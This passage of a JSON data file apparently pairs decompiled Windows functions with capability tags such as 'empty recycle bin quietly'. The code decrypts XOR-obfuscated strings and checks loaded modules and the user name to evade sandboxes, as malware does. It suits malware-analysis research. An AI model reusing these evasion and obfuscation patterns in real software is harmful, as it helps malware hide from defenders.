var_14h._3_1_ = 4;\n    var_10h._0_1_ = 0x51;\n    var_10h._2_1_ = 0x33;\n    var_10h._3_1_ = 0x3f;\n    var_ch._0_1_ = 0x13;\n    var_ch._1_1_ = 0x5a;\n    var_ch._2_1_ = 5;\n    var_ch._3_1_ = 0x3d;\n    var_8h._0_1_ = 3;\n    var_8h._1_1_ = 4;\n    var_8h._2_1_ = 0x54;\n    var_8h._3_1_ = 0x16;\n    var_4h = 0x54;\n    var_50h = 0x616f5473;\n    var_4ch._0_1_ = 0x33;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    var_68h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar17 = 0;\n    do {\n        puVar1 = iVar17 + var_68h;\n        iVar18 = iVar17 % var_38h;\n        iVar17 = iVar17 + 1;\n        *puVar1 = *(&var_50h + iVar18) ^ puVar1[&var_14h - var_68h];\n    } while (iVar17 < 0x11);\n    fcn.0040b2ab();\n    var_14h._0_1_ = 0x36;\n    var_14h._1_1_ = 0x5c;\n    var_14h._2_1_ = 0x30;\n    var_14h._3_1_ = 0x45;\n    var_10h._0_1_ = 0x1e;\n    var_10h._1_1_ = 0x10;\n    var_10h._2_1_ = 0x11;\n    var_10h._3_1_ = 0x69;\n    var_ch._0_1_ = 3;\n    var_ch._1_1_ = 0x59;\n    var_ch._2_1_ = 0xc;\n    var_ch._3_1_ = 0x10;\n    var_8h._0_1_ = 9;\n    var_8h._1_1_ = 0x5c;\n    var_8h._2_1_ = 0x16;\n    var_8h._3_1_ = 0x55;\n    var_4h = 0x7a;\n    var_28h = 0x30713965;\n    var_24h._0_2_ = 0x797a;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    var_50h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar17 = 0;\n    do {\n        puVar1 = iVar17 + var_50h;\n        iVar18 = iVar17 % var_34h;\n        iVar17 = iVar17 + 1;\n        *puVar1 = *(&var_28h + iVar18) ^ puVar1[&var_14h - var_50h];\n    } while (iVar17 < 0x11);\n    fcn.0040b2ab();\n    var_20h._0_1_ = 0x3a;\n    var_20h._1_1_ = 0x3c;\n    var_20h._2_1_ = 0x23;\n    var_20h._3_1_ = 0x12;\n    var_1ch = 0x340c471b;\n    var_18h._0_1_ = 0x35;\n    var_18h._1_1_ = 5;\n    var_18h._2_2_ = 0x5a1e;\n    var_14h._0_1_ = 0x1b;\n    var_14h._1_1_ = 0x36;\n    var_14h._2_1_ = 0x1e;\n    var_14h._3_1_ = 6;\n    var_10h._0_1_ = 0xd;\n    var_10h._1_1_ = 0x5d;\n    var_10h._2_1_ = 0x1d;\n    var_10h._3_1_ = 9;\n    var_ch._0_1_ = 2;\n    var_ch._1_1_ = 2;\n    var_ch._2_1_ = 0x1e;\n    var_ch._3_1_ = 0x5a;\n    var_8h._1_1_ = 0x3c;\n    var_8h._2_1_ = 0x17;\n    var_8h._3_1_ = 0xe;\n    var_4h = 0x68;\n    var_28h = 0x6b705969;\n    var_24h._0_2_ = 0x3368;\n    var_8h._0_1_ = var_18h._1_1_;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1e);\n    iVar17 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar18 = 0;\n    do {\n        puVar1 = iVar18 + iVar17;\n        iVar19 = iVar18 % var_34h;\n        iVar18 = iVar18 + 1;\n        *puVar1 = *(&var_28h + iVar19) ^ puVar1[&var_20h - iVar17];\n    } while (iVar18 < 0x1d);\n    fcn.0040b2ab();\n    var_18h._0_1_ = 0x65;\n    var_18h._1_1_ = 0x3f;\n    var_18h._2_2_ = 0x2771;\n    var_14h._0_1_ = 0x54;\n    var_14h._1_1_ = 0x58;\n    var_14h._2_1_ = 0x3d;\n    var_14h._3_1_ = 0x57;\n    var_10h._0_1_ = 1;\n    var_10h._1_1_ = 0x5a;\n    var_10h._2_1_ = 0x42;\n    var_10h._3_1_ = 0x33;\n    var_ch._0_1_ = 0x54;\n    var_ch._1_1_ = 0x36;\n    var_ch._2_1_ = 0x65;\n    var_ch._3_1_ = 0x44;\n    var_8h._0_1_ = 0x33;\n    var_8h._1_1_ = 0x44;\n    var_8h._2_1_ = 0x26;\n    var_8h._3_1_ = 0x59;\n    var_4h = 0x53;\n    var_3h._0_1_ = 0x3d;\n    var_3h._1_1_ = 0x57;\n    var_3h._2_1_ = 0x4f;\n    var_58h = 0x4f325a36;\n    var_54h._0_1_ = 0x35;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    iVar18 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar19 = 0;\n    do {\n        puVar1 = iVar19 + iVar18;\n        iVar20 = iVar19 % var_38h;\n        iVar19 = iVar19 + 1;\n        *puVar1 = *(&var_58h + iVar20) ^ puVar1[&var_18h - iVar18];\n    } while (iVar19 < 0x18);\n    fcn.0040b2ab();\n    var_1ch = 0x5716171c;\n    var_18h._0_1_ = 7;\n    var_18h._1_1_ = 0xe;\n    var_18h._2_2_ = 0x173b;\n    var_14h._0_1_ = 0x17;\n    var_14h._1_1_ = 0x5a;\n    var_14h._2_1_ = 0x1f;\n    var_14h._3_1_ = 0x15;\n    var_10h._0_1_ = 0x2b;\n    var_10h._1_1_ = 0x1d;\n    var_10h._2_1_ = 0x33;\n    var_10h._3_1_ = 0x5c;\n    var_ch._0_1_ = 0x3a;\n    var_ch._1_1_ = 0x13;\n    var_ch._2_1_ = 0x26;\n    var_ch._3_1_ = 4;\n    var_8h._0_1_ = 0x2d;\n    var_8h._1_1_ = 0x5e;\n    var_8h._2_1_ = 0xf;\n    var_8h._3_1_ = 6;\n    var_4h = 0x2a;\n    var_3h._0_1_ = 0x72;\n    var_28h = 0x3244724f;\n    var_24h._0_2_ = 0x616a;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1b);\n    var_58h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar19 = 0;\n    do {\n        puVar1 = iVar19 + var_58h;\n        iVar20 = iVar19 % var_34h;\n        iVar19 = iVar19 + 1;\n        *puVar1 = *(&var_28h + iVar20) ^ puVar1[&var_1ch - var_58h];\n    } while (iVar19 < 0x1a);\n    fcn.0040b2ab();\n    var_14h._0_1_ = 10;\n    var_14h._1_1_ = 0x55;\n    var_14h._2_1_ = 0xf;\n    var_14h._3_1_ = 0x57;\n    var_10h._0_1_ = 0;\n    var_10h._1_1_ = 0x36;\n    var_10h._2_1_ = 0x53;\n    var_10h._3_1_ = 0x31;\n    var_ch._0_1_ = 0x69;\n    var_ch._1_1_ = 0x16;\n    var_ch._2_1_ = 0x30;\n    var_ch._3_1_ = 0x46;\n    var_8h._0_1_ = 0x33;\n    var_8h._1_1_ = 0x55;\n    var_8h._2_1_ = 1;\n    var_8h._3_1_ = 0x3e;\n    var_4h = 0x55;\n    var_3h._0_1_ = 0x5a;\n    var_48h = 0x395a3059;\n    var_44h._0_1_ = 100;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n    iVar19 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar20 = 0;\n    do {\n        puVar1 = iVar20 + iVar19;\n        iVar21 = iVar20 % var_38h;\n        iVar20 = iVar20 + 1;\n        *puVar1 = *(&var_48h + iVar21) ^ puVar1[&var_14h - iVar19];\n    } while (iVar20 < 0x12);\n    fcn.0040b2ab();\n    var_18h._0_1_ = 0x3b;\n    var_18h._1_1_ = 0x11;\n    var_18h._2_2_ = 20000;\n    var_14h._0_1_ = 0x14;\n    var_14h._1_1_ = 0x54;\n    var_14h._2_1_ = 0x29;\n    var_14h._3_1_ = 0x13;\n    var_10h._0_1_ = 0x16;\n    var_10h._1_1_ = 0x59;\n    var_10h._2_1_ = 0xe;\n    var_10h._3_1_ = 0x67;\n    var_ch._0_1_ = 0x1a;\n    var_ch._1_1_ = 0x1d;\n    var_ch._2_1_ = 5;\n    var_ch._3_1_ = 0x5e;\n    var_8h._0_1_ = 0x16;\n    var_8h._1_1_ = 0x52;\n    var_8h._2_1_ = 0xf;\n    var_8h._3_1_ = 0x11;\n    var_4h = 0x73;\n    var_28h = 0x37737468;\n    var_24h._0_2_ = 0x377a;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x16);\n    var_48h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar20 = 0;\n    do {\n        puVar1 = iVar20 + var_48h;\n        iVar21 = iVar20 % var_34h;\n        iVar20 = iVar20 + 1;\n        *puVar1 = *(&var_28h + iVar21) ^ puVar1[&var_18h - var_48h];\n    } while (iVar20 < 0x15);\n    fcn.0040b2ab();\n    var_1ch = 0x2422281e;\n    var_18h._0_1_ = 4;\n    var_18h._1_1_ = 0x2f;\n    var_18h._2_2_ = 0x221;\n    var_14h._0_1_ = 0xe;\n    var_14h._1_1_ = 0;\n    var_14h._2_1_ = 0x21;\n    var_14h._3_1_ = 0x28;\n    var_10h._0_1_ = 0;\n    var_10h._1_1_ = 0x2b;\n    var_10h._2_1_ = 0x11;\n    var_10h._3_1_ = 0x24;\n    var_ch._0_1_ = 0x22;\n    var_ch._1_1_ = 9;\n    var_ch._2_1_ = 0x1a;\n    var_ch._3_1_ = 0x17;\n    var_8h._0_1_ = 0x24;\n    var_8h._1_1_ = 0x3b;\n    var_8h._2_1_ = 0xe;\n    var_8h._3_1_ = 0x26;\n    var_4h = 0;\n    var_3h._0_1_ = 0x2a;\n    var_3h._1_1_ = 0x28;\n    var_3h._2_1_ = 0x67;\n    var_70h = 0x4a674d4d;\n    var_6ch._0_1_ = 0x65;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1d);\n    iVar20 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar21 = 0;\n    do {\n        puVar1 = iVar21 + iVar20;\n        iVar22 = iVar21 % var_38h;\n        iVar21 = iVar21 + 1;\n        *puVar1 = *(&var_70h + iVar22) ^ puVar1[&var_1ch - iVar20];\n    } while (iVar21 < 0x1c);\n    fcn.0040b2ab();\n    var_18h._0_1_ = 0x2b;\n    var_18h._1_1_ = 6;\n    var_18h._2_2_ = 0xf04;\n    var_14h._0_1_ = 0x2b;\n    var_14h._1_1_ = 0x38;\n    var_14h._2_1_ = 0x1f;\n    var_10h._0_1_ = 0x1f;\n    var_10h._1_1_ = 1;\n    var_10h._2_1_ = 0x29;\n    var_10h._3_1_ = 0x2c;\n    var_ch._0_1_ = 0x15;\n    var_ch._2_1_ = 0x19;\n    var_ch._3_1_ = 0x1c;\n    var_8h._0_1_ = 0x2c;\n    var_8h._1_1_ = 0x2f;\n    var_8h._2_1_ = 0x11;\n    var_8h._3_1_ = 0xf;\n    var_4h = 0x2c;\n    var_3h._0_1_ = 9;\n    var_3h._1_1_ = 0x20;\n    var_3h._2_1_ = 0x59;\n    var_28h = 0x6e496378;\n    var_24h._0_2_ = 0x5945;\n    var_14h._3_1_ = var_18h._1_1_;\n    var_ch._1_1_ = var_18h._1_1_;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    var_70h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar21 = 0;\n    do {\n        puVar1 = iVar21 + var_70h;\n        iVar22 = iVar21 % var_34h;\n        iVar21 = iVar21 + 1;\n        *puVar1 = *(&var_28h + iVar22) ^ puVar1[&var_18h - var_70h];\n    } while (iVar21 < 0x18);\n    fcn.0040b2ab();\n    var_10h._0_1_ = 5;\n    var_18h._0_1_ = 0;\n    var_18h._1_1_ = 0xb;\n    var_18h._2_2_ = 0x704;\n    var_14h._0_1_ = 10;\n    var_14h._1_1_ = 0x36;\n    var_14h._2_1_ = 0x1c;\n    var_14h._3_1_ = 0x3e;\n    var_10h._1_1_ = 0x14;\n    var_10h._2_1_ = 0x32;\n    var_10h._3_1_ = 0x1a;\n    var_ch._0_1_ = 0x28;\n    var_ch._1_1_ = 0x3a;\n    var_ch._2_1_ = 8;\n    var_ch._3_1_ = 0x3a;\n    var_8h._0_1_ = 0x18;\n    var_8h._1_1_ = 0x24;\n    var_8h._2_1_ = 6;\n    var_8h._3_1_ = 0x1f;\n    var_4h = 0x34;\n    var_3h._0_1_ = 0xb;\n    var_3h._1_1_ = 0x4d;\n    var_60h = 0x6a4d6e53;\n    var_5ch._0_1_ = 0x7a;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n    iVar21 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar22 = 0;\n    do {\n        puVar1 = iVar22 + iVar21;\n        iVar23 = iVar22 % var_38h;\n        iVar22 = iVar22 + 1;\n        *puVar1 = *(&var_60h + iVar23) ^ puVar1[&var_18h - iVar21];\n    } while (iVar22 < 0x17);\n    fcn.0040b2ab();\n    var_18h._0_1_ = 0x3d;\n    var_18h._1_1_ = 0x5c;\n    var_18h._2_2_ = 0x1f74;\n    var_14h._0_1_ = 0x30;\n    var_14h._1_1_ = 0x24;\n    var_14h._2_1_ = 0x1a;\n    var_14h._3_1_ = 0x5c;\n    var_10h._0_1_ = 0x70;\n    var_10h._1_1_ = 1;\n    var_10h._2_1_ = 0x3a;\n    var_10h._3_1_ = 0x27;\n    var_ch._0_1_ = 0xf;\n    var_ch._1_1_ = 0x55;\n    var_ch._2_1_ = 0x67;\n    var_ch._3_1_ = 0x1f;\n    var_8h._0_1_ = 0x3c;\n    var_8h._1_1_ = 0x33;\n    var_8h._2_1_ = 7;\n    var_8h._3_1_ = 0x55;\n    var_4h = 0x52;\n    var_3h._0_1_ = 10;\n    var_3h._1_1_ = 0x30;\n    var_3h._2_1_ = 0x45;\n    var_28h = 0x6d37396e;\n    var_24h._0_2_ = 0x4555;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    var_60h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar22 = 0;\n    do {\n        puVar1 = iVar22 + var_60h;\n        iVar23 = iVar22 % var_34h;\n        iVar22 = iVar22 + 1;\n        *puVar1 = *(&var_28h + iVar23) ^ puVar1[&var_18h - var_60h];\n    } while (iVar22 < 0x18);\n    fcn.0040b2ab();\n    var_20h._3_1_ = 5;\n    var_20h._0_1_ = 0x62;\n    var_20h._1_1_ = 0x33;\n    var_20h._2_1_ = 0xe;\n    var_1ch = 0x33453b06;\n    var_18h._0_1_ = 0x3e;\n    var_18h._1_1_ = 0x34;\n    var_18h._2_2_ = 0x2d01;\n    var_14h._0_1_ = 0x55;\n    var_14h._1_1_ = 0x1b;\n    var_14h._2_1_ = 0x3b;\n    var_14h._3_1_ = 0x19;\n    var_10h._0_1_ = 0x32;\n    var_10h._1_1_ = 0x2b;\n    var_10h._2_1_ = 0x52;\n    var_10h._3_1_ = 0x33;\n    var_ch._0_1_ = 0x29;\n    var_ch._1_1_ = 4;\n    var_ch._2_1_ = 0x23;\n    var_ch._3_1_ = 0x3a;\n    var_8h._0_1_ = 0x58;\n    var_8h._1_1_ = 0x20;\n    var_8h._2_1_ = 0x33;\n    var_8h._3_1_ = 0x1b;\n    var_4h = 0x16;\n    var_3h._0_1_ = 0x2f;\n    var_3h._1_1_ = 0x54;\n    var_3h._2_1_ = 0x56;\n    var_28h = 0x775a5631;\n    var_24h._0_2_ = 0x4873;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    iVar22 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar23 = 0;\n    do {\n        puVar1 = iVar23 + iVar22;\n        iVar24 = iVar23 % var_34h;\n        iVar23 = iVar23 + 1;\n        *puVar1 = *(&var_28h + iVar24) ^ puVar1[&var_20h - iVar22];\n    } while (iVar23 < 0x20);\n    fcn.0040b2ab();\n    var_14h._0_1_ = 0x12;\n    var_14h._1_1_ = 0x2d;\n    var_14h._2_1_ = 99;\n    var_14h._3_1_ = 0;\n    var_10h._0_1_ = 0x29;\n    var_10h._1_1_ = 0x34;\n    var_10h._2_1_ = 0x23;\n    var_10h._3_1_ = 0x2d;\n    var_ch._0_1_ = 0x5d;\n    var_ch._1_1_ = 0x35;\n    var_ch._2_1_ = 0x37;\n    var_ch._3_1_ = 0x3c;\n    var_8h._0_1_ = 0x37;\n    var_8h._1_1_ = 0x21;\n    var_8h._2_1_ = 0x5d;\n    var_8h._3_1_ = 0;\n    var_4h = 0x22;\n    var_3h._0_1_ = 0x30;\n    var_3h._1_1_ = 0x41;\n    var_28h = 0x65314841;\n    var_24h._0_2_ = 0x5545;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar23 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar24 = 0;\n    do {\n        puVar1 = iVar24 + iVar23;\n        iVar25 = iVar24 % var_34h;\n        iVar24 = iVar24 + 1;\n        *puVar1 = *(&var_28h + iVar25) ^ puVar1[&var_14h - iVar23];\n    } while (iVar24 < 0x13);\n    fcn.0040b2ab();\n    var_20h._0_1_ = 0x20;\n    var_20h._1_1_ = 3;\n    var_20h._2_1_ = 0x71;\n    var_20h._3_1_ = 0x2f;\n    var_1ch = 0x7163b02;\n    var_18h._0_1_ = 0x4b;\n    var_18h._1_1_ = 0x24;\n    var_18h._2_2_ = 0x2636;\n    var_14h._0_1_ = 1;\n    var_14h._1_1_ = 0xd;\n    var_14h._2_1_ = 0x51;\n    var_14h._3_1_ = 0x2f;\n    var_10h._0_1_ = 6;\n    var_10h._1_1_ = 0x1a;\n    var_10h._2_1_ = 0x16;\n    var_10h._3_1_ = 0x12;\n    var_ch._0_1_ = 0x68;\n    var_ch._1_1_ = 0x33;\n    var_ch._2_1_ = 8;\n    var_ch._3_1_ = 0x3f;\n    var_8h._0_1_ = 0x1a;\n    var_8h._1_1_ = 10;\n    var_8h._2_1_ = 0x5d;\n    var_8h._3_1_ = 0x26;\n    var_4h = 4;\n    var_3h._0_1_ = 0x49;\n    var_28h = 0x41386673;\n    var_24h._0_2_ = 0x4961;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n    iVar24 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar25 = 0;\n    do {\n        puVar1 = iVar25 + iVar24;\n        iVar26 = iVar25 % var_34h;\n        iVar25 = iVar25 + 1;\n        *puVar1 = *(&var_28h + iVar26) ^ puVar1[&var_20h - iVar24];\n    } while (iVar25 < 0x1e);\n    fcn.0040b2ab();\n    var_14h._0_1_ = 9;\n    var_14h._1_1_ = 0x3d;\n    var_14h._2_1_ = 0x35;\n    var_14h._3_1_ = 0x27;\n    var_10h._0_1_ = 6;\n    var_10h._1_1_ = 0x3f;\n    var_10h._2_1_ = 2;\n    var_10h._3_1_ = 0xe;\n    var_ch._0_1_ = 0x20;\n    var_ch._1_1_ = 0xe;\n    var_ch._2_1_ = 10;\n    var_ch._3_1_ = 0x2a;\n    var_8h._0_1_ = 8;\n    var_8h._1_1_ = 0x38;\n    var_8h._2_1_ = 2;\n    var_8h._3_1_ = 0x36;\n    var_4h = 0x3d;\n    var_3h._1_1_ = 0x2b;\n    var_3h._2_1_ = 0x6b;\n    var_28h = 0x4e61585a;\n    var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x6b);\n    var_3h._0_1_ = var_10h;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar25 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar26 = 0;\n    do {\n        puVar1 = iVar26 + iVar25;\n        iVar27 = iVar26 % var_38h;\n        iVar26 = iVar26 + 1;\n        *puVar1 = *(&var_28h + iVar27) ^ puVar1[&var_14h - iVar25];\n    } while (iVar26 < 0x14);\n    fcn.0040b2ab();\n    var_18h._0_1_ = 5;\n    var_20h._0_1_ = 0x1c;\n    var_20h._1_1_ = 0x2d;\n    var_20h._2_1_ = 0x15;\n    var_20h._3_1_ = 0x37;\n    var_1ch = 0x2d3b5251;\n    var_18h._1_1_ = 0x3c;\n    var_18h._2_2_ = 0x5159;\n    var_14h._0_1_ = 0x20;\n    var_14h._1_1_ = 0x24;\n    var_14h._2_1_ = 0x3f;\n    var_14h._3_1_ = 0x26;\n    var_10h._0_1_ = 0x78;\n    var_10h._1_1_ = 0x5a;\n    var_10h._2_1_ = 0x21;\n    var_10h._3_1_ = 0x23;\n    var_ch._0_1_ = 6;\n    var_ch._1_1_ = 0x37;\n    var_ch._2_1_ = 0x5d;\n    var_ch._3_1_ = 0x45;\n    var_8h._0_1_ = 0x26;\n    var_8h._1_1_ = 0x24;\n    var_8h._2_1_ = 0x33;\n    var_8h._3_1_ = 0x22;\n    var_4h = 0x51;\n    var_3h._0_1_ = 0x33;\n    var_28h = 0x4556484f;\n    var_24h._0_2_ = 0x3334;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n    iVar26 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar27 = 0;\n    do {\n        puVar1 = iVar27 + iVar26;\n        iVar28 = iVar27 % var_34h;\n        iVar27 = iVar27 + 1;\n        *puVar1 = *(&var_28h + iVar28) ^ puVar1[&var_20h - iVar26];\n    } while (iVar27 < 0x1e);\n    fcn.0040b2ab();\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar26);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar25);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar24);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar23);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar22);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_60h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar21);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_70h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar20);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_48h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar19);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_58h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar18);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar17);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_50h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_68h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar16);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar15);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_40h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar14);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar13);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_78h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_80h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar12);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar11);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_88h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar10);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_90h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar9);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar8);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar7);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar6);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_98h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar29);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar5);\n    (*pcVar2)(uVar4);\n    return;\n}\n",
        "token_count": 19429
    },
    "00409885": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00409885(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    char cVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    uint32_t uVar16;\n    int32_t iVar17;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint pcbBuffer;\n    int32_t var_bch;\n    int32_t var_b8h;\n    int32_t var_b4h;\n    uint var_b0h;\n    int32_t var_ach;\n    uint var_a8h;\n    int32_t var_a4h;\n    uint var_a0h;\n    int32_t var_9ch;\n    uint var_98h;\n    int32_t var_94h;\n    uint var_90h;\n    int32_t var_8ch;\n    uint var_88h;\n    int32_t var_84h;\n    uint var_80h;\n    int32_t var_7ch;\n    int32_t var_78h;\n    int32_t var_74h;\n    int32_t var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar5 = fcn.0040a692();\n    if (iVar5 != 0) {\n        fcn.0040a5e9();\n    }\n    var_14h._0_1_ = 0x37;\n    var_14h._1_1_ = 0x2e;\n    var_14h._2_1_ = 0x2c;\n    var_14h._3_1_ = 2;\n    var_10h._0_1_ = 0x12;\n    var_10h._1_1_ = 0x3f;\n    var_10h._2_1_ = 0x3c;\n    var_10h._3_1_ = 0x65;\n    var_ch._0_1_ = 0xe;\n    var_ch._1_1_ = 0x1b;\n    var_ch._2_1_ = 0x3f;\n    var_ch._3_1_ = 0x4c;\n    var_8ch = 0x6a4b4c53;\n    var_88h._0_1_ = 0x77;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    var_78h = 5;\n    iVar17 = 0;\n    var_74h = &var_14h - iVar5;\n    do {\n        puVar1 = iVar17 + iVar5;\n        iVar7 = iVar17 % 5;\n        iVar17 = iVar17 + 1;\n        *puVar1 = *(&var_8ch + iVar7) ^ puVar1[&var_14h - iVar5];\n    } while (iVar17 < 0xc);\n    iVar17 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar5);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar17 != 0) {\n        fcn.0040a5e9();\n    }\n    var_14h._0_1_ = 9;\n    var_14h._1_1_ = 0x32;\n    var_14h._2_1_ = 0x38;\n    var_14h._3_1_ = 0x16;\n    var_10h._0_1_ = 0x30;\n    var_10h._1_1_ = 0xb;\n    var_10h._2_1_ = 0x16;\n    var_10h._3_1_ = 0x7e;\n    var_ch._0_1_ = 0x35;\n    var_ch._1_1_ = 0x1f;\n    var_ch._2_1_ = 0x38;\n    var_ch._3_1_ = 0x67;\n    var_b4h = 0x7351507a;\n    var_b0h._0_2_ = 0x6754;\n    uVar6 = (*pcVar3)(8, 0xd);\n    var_8ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    var_30h = 6;\n    iVar17 = 0;\n    var_74h = &var_14h - var_8ch;\n    do {\n        puVar1 = iVar17 + var_8ch;\n        iVar7 = iVar17 % 6;\n        iVar17 = iVar17 + 1;\n        *puVar1 = *(&var_b4h + iVar7) ^ puVar1[&var_14h - var_8ch];\n    } while (iVar17 < 0xc);\n    iVar17 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_8ch);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar17 != 0) {\n        fcn.0040a5e9();\n    }\n    pcbBuffer = 0x400;\n    iVar17 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(0x41cdf0, &pcbBuffer);\n    if (iVar17 == 0) {\n        fcn.0040a5e9();\n    }\n    var_14h._0_1_ = 0x3b;\n    var_14h._1_1_ = 7;\n    var_14h._2_1_ = 0x36;\n    var_14h._3_1_ = 0x42;\n    var_10h._0_1_ = 0x13;\n    var_10h._1_1_ = 0x16;\n    var_10h._2_1_ = 6;\n    var_10h._3_1_ = 0x11;\n    var_ch._0_1_ = 